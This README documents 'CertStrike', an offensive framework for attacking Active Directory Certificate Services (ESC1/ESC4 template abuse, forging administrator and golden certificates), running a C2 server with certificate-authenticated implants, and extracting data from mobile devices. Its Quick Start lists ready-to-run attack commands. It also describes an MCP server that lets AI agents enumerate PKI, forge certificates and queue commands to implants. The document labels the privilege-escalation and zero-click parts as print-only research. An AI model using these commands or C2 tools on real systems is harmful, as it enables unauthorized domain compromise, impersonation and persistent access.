# CertStrike

Next-generation PKI, certificate, and mobile attack framework with integrated C2 capabilities.

## Features

### ADCS / PKI Exploitation
- **Native LDAP enumeration** of certificate templates (no ldapsearch binary dependency)
- **ESC1-ESC4 vulnerability detection** with automatic scoring (ESC4 flags templates with security descriptors for manual SDDL/ACE review — does not parse ACEs)
- **ESC1 exploitation**: forge certificates with arbitrary UPN via misconfigured templates
- **ESC4 exploitation**: modify template ACLs → exploit as ESC1 → auto-restore
- **Attack chain auto-detection**: scan all templates, score vulnerabilities, output prioritized attack paths
- **Golden certificate forging** with UPN SAN for smart card / Kerberos PKINIT authentication

### C2 Framework
- HTTP/HTTPS listeners with auto-generated self-signed TLS certificates
- Implant session management: registration, polling, command queue, result collection
- **Certificate persistence**: cert-auth implants authenticate via forged certificates (Schannel mTLS)
- Stager configuration generation

### Mobile Exploitation
- **ClearBrite** forensic-grade logical device extraction via ADB
- Zero-click exploit **simulation** for research (Pegasus, Predator, Chrysaor attack chain simulation — print-only, no real exploitation)

### MCP Server
6 tools for agentic integration: `pki_enumerate`, `pki_forge`, `c2_list_sessions`, `c2_queue_command`, `c2_get_results`, `mobile_extract`

### Operator Console
Bubbletea-based TUI with views: Sessions, Commands, Listeners, Implants. Starts empty, populated by live C2 sessions.

**Starting a demo/test session to see the TUI in action:**
```bash
# Terminal 1: start a C2 listener
./certstrike c2 --port 8443 --protocol https

# Terminal 2: launch the operator console
./certstrike console

# Terminal 3: simulate an implant check-in (curl the registration endpoint)
curl -k -X POST https://localhost:8443/register \
  -H 'Content-Type: application/json' \
  -d '{"hostname":"demo-host","username":"testuser","os":"linux","arch":"amd64","pid":12345}'
# The Sessions tab in the console will populate once the implant checks in.
```

### SmartPotato *(Educational / Skeleton)*
Windows privilege escalation reference implementation documenting JuicyPotato, RoguePotato, SweetPotato attack chains. Currently outputs technique descriptions and COM flow diagrams — does not execute real privilege escalation. Requires Windows-specific syscall implementation (`golang.org/x/sys/windows`) to become operational.

## Operational vs Research-Only Components

| Component | Status | Notes |
|-----------|--------|-------|
| ADCS enumeration (`pki --enum`) | **Operational** | Native LDAP, no external deps |
| ESC1/ESC4 exploitation | **Operational** | Live LDAP writes; requires WriteDacl for ESC4 |
| Certificate forging | **Operational** | Pure Go, CGO_ENABLED=0 |
| C2 listener + session management | **Operational** | HTTP/HTTPS, cert-auth implants |
| ClearBrite ADB extraction | **Operational** | Requires `adb` in PATH and an authorized device |
| MCP server (6 tools) | **Operational** | stdio JSON-RPC |
| Operator console (TUI) | **Operational** | Requires live C2 sessions to show data; see below |
| SmartPotato (Windows privesc) | **Research / Skeleton** | Prints technique flow only; no real exploitation — see below |
| Zero-click simulation | **Research / Skeleton** | Prints attack chain descriptions only; no real exploitation — see below |

### SmartPotato — Research Reference Only

`implants/smartpotato/` documents JuicyPotato, RoguePotato, and SweetPotato Windows privilege
escalation techniques. It **does not execute real privilege escalation**. On non-Windows platforms it
prints the COM/RPC flow for educational purposes. On Windows it would require `golang.org/x/sys/windows`
syscall bindings (VirtualAlloc, ImpersonateNamedPipeClient, CreateProcessWithTokenW, etc.) to become
operational — those bindings are intentionally absent. Treat this as a technique reference, not a
working tool.

### Zero-Click Simulation — Research Reference Only

`pkg/mobile.SimulateZeroClick()` (invoked via `certstrike mobile --simulate`) performs network port
scanning via `nmap`/`nc` and **prints** the Pegasus, Predator, and Chrysaor attack chain stages. It
does **not** deliver any payload or exploit any vulnerability. The simulation terminates with an
explicit disclaimer message. It is provided for research awareness and training purposes only.

## Quick Start

```bash
# Build
CGO_ENABLED=0 go build -o certstrike ./cmd/certstrike

# Enumerate ADCS templates
./certstrike pki --enum --target-dc dc01.corp.local --domain corp.local --username user --password pass

# Auto-detect ESC vulnerabilities
./certstrike pki --auto-detect --target-dc dc01.corp.local --domain corp.local --username user --password pass

# Exploit ESC1
./certstrike pki --exploit esc1 --template VulnTemplate --upn administrator@corp.local \
  --target-dc dc01.corp.local --domain corp.local --username user --password pass

# Forge golden certificate
./certstrike pki --forge --upn admin@corp.local --output admin.pem

# Start C2 listener
./certstrike c2 --port 8443 --protocol https

# Generate cert-auth implant
./certstrike c2 --implant-type cert-auth --upn admin@corp.local --c2-url https://c2:8443

# Launch operator console
./certstrike console

# Start MCP server
./certstrike mcp

# Mobile extraction
./certstrike mobile --extract --device-id emulator-5554 --output-dir ./extraction
```

## Architecture

```
cmd/certstrike/     CLI entry points (cobra)
pkg/pki/            ADCS enumeration, ESC exploitation, certificate forging
pkg/c2/             C2 listener, session management, cert-auth implants
pkg/mobile/         ADB extraction (ClearBrite), zero-click simulation
internal/mcp/       MCP stdio server (6 tools)
internal/tui/       Bubbletea operator console
implants/smartpotato/ Windows privilege escalation
```

## Known Limitations

### ESC4 — ACE / SDDL Parsing Is Manual Review Only

The ESC4 detection logic in `pkg/pki/adcs.go:scoreESC()` flags any template that has a non-empty
`nTSecurityDescriptor` LDAP attribute as `ESC4-CHECK`. It does **not** parse the raw SDDL or
decompose the Access Control Entries (ACEs) to verify that the current user actually holds
WriteDacl or WriteOwner rights.

Consequence: `ESC4-CHECK` results are **candidates for manual review**, not confirmed
vulnerabilities. To confirm exploitability, inspect the security descriptor with:
- `Get-Acl "AD:CN=<TemplateName>,CN=Certificate Templates,..."` (PowerShell)
- `certipy find --vulnerable` (cross-references with current user's effective permissions)

The ESC4 exploitation path (`--exploit esc4`) will fail at the LDAP Modify step if the
authenticated user lacks the necessary ACE — it does not silently succeed on a false positive.

### SmartPotato and Zero-Click Simulation — Not Operational

See the [Operational vs Research-Only Components](#operational-vs-research-only-components) section above.

### C2 Implant Polling — No Persistent Agent Binary

The `c2 --implant-type cert-auth` command generates a stager configuration JSON, not a compiled
implant binary. A Go agent that reads this configuration and implements the polling loop is not
included.

## Dependencies
All pure Go, CGO_ENABLED=0 compatible:
- `github.com/spf13/cobra` — CLI framework
- `github.com/go-ldap/ldap/v3` — Native LDAP client
- `github.com/charmbracelet/bubbletea` — TUI framework
- `github.com/charmbracelet/lipgloss` — TUI styling
